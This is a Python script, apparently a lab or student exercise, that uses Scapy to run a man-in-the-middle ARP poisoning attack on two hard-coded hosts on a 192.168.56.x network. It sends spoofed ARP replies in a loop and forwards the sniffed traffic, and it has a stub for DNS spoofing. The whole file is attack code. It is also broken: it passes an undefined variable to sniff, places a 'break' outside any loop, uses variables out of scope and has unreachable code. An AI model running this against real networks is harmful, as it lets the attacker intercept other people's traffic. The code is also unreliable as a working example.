# File in which we test stuff

# MITM ARP spoofing attack - using Scapy

# Imports
from scapy.all import *

# The main method to be ran by the user of our script
def main():
    typeOfAttack = int(input("Choose your attack. \nType 1 for a MITM ARP poisoning attack.\nType 2 for a DNS spoofing attack.\nType of attack: "))
    if (typeOfAttack == 1):
        arppoison()
    elif (typeOfAttack == 2):
        print("This function has not been implemented yet.")
		#dnsSpoof()
    else:
        print("No or wrong input.")

def arppoison():
    # The user is given the option to choose how many hosts will be attacked during the ARP poisoning attack.
    nrOfHosts = int(input("The number of hosts you want to ARP poison: "))

    # If number of hosts is less than 2, a while loop is instantiated which can only be left if the number of hosts becomes greater or equal than 2
    if (nrOfHosts < 2):
        print("A MITM ARP poisoning attack with less than 2 hosts is not possible.")
        print("The number of hosts you want to ARP poison: ")
        while (nrOfHosts < 2):
            nrOfHosts = input()

    macVictimList = []
    ipVictimList = []

    # The MAC and IP addresses of the victims and the attacker are obtained
    # victims must be separated into two groups, servers and hosts
    #for i in range(nrOfHosts): 

    # Victim 1
    macVictimList.append("08:00:27:B7:C4:AF")
    ipVictimList.append("192.168.56.101")

    # Victim 2
    macVictimList.append("08:00:27:CC:08:6F")
    ipVictimList.append("192.168.56.102")

    # The attacker
    macAttacker = "08:00:27:D0:25:4B"
    # ipAttacker = input("The IP address of the attacker: ")


    #for (i in nrOfHosts):
    #    arp
    
    if (nrOfHosts == 2):
        # Send ARP package to victim 1 of spoofed IP victim 2
        arp1 = Ether() / ARP()
        arp1[Ether].src = macAttacker
        arp1[ARP].hwsrc = macAttacker
        arp1[ARP].psrc = ipVictimList[1]
        arp1[ARP].hwdst = macVictimList[0]
        arp1[ARP].pdst = ipVictimList[0]
        sendp(arp1, iface="enp0s3")

        # Send ARP package to victim 2 of spoofed IP victim 1
        arp2 = Ether() / ARP()
        arp2[Ether].src = macAttacker
        arp2[ARP].hwsrc = macAttacker
        arp2[ARP].psrc = ipVictimList[0]
        arp2[ARP].hwdst = macVictimList[1]
        arp2[ARP].pdst = ipVictimList[1]
        sendp(arp2, iface="enp0s3")
        
        # Call sniff to start sniffing for incoming packets from victims, and resend packets received via forward_packet
        sniff(prn=forward_packet(packet), iface = "enp0s3")

        # A infinite loop is used to send ARP packages continuously updating the ARP tables of the victims
        while(True):
            # Send ARP package to victim 1 of spoofed IP victim 2
            sendp(arp1, iface="enp0s3")

            # Send ARP package to victim 2 of spoofed IP victim 1
            sendp(arp2, iface="enp0s3")

            # Timer
            time.sleep(3)

    
# This method is used to forward the received packet we sniffed to the host it was intended to be sent to
def forward_packet(packet):
        if (packet[IP].dst == ipVictimList[1] and packet[Ether].dst == macAttacker):
            # Once we have the IP address of the destination, we must change the MAC address to what it should have been if it was not spoofed
            packet[Ether].dst = macVictimList[1]
            # We also change the source MAC address to the attacker's MAC address so we can listen in on the response
            packet[Ether].src = macAttacker
            # Resend the packet to it's rightful destination
            sendp(packet)
            print("A packet from " + str(packet[IP].src) + " has been redirected to " + str(packet[IP].dst))

        if (packet[IP].dst == ipVictimList[0] and packet[Ether].dst == macAttacker):
            # Once we have the IP address of the destination, we must change the MAC address to what it should have been if it was not spoofed
            packet[Ether].dst = macVictimList[0]
            # We also change the source MAC address to the attacker's MAC address so we can listen in on the response
            packet[Ether].src = macAttacker
            # Resend the packet to it's rightful destination
            sendp(packet)
            # Let the attacker know who sent a packet to whom
            print("A packet from " + str(packet[IP].src) + " has been redirected to " + str(packet[IP].dst))

            # If a match has been found we break out of the loop as only one match can be found
            break

main()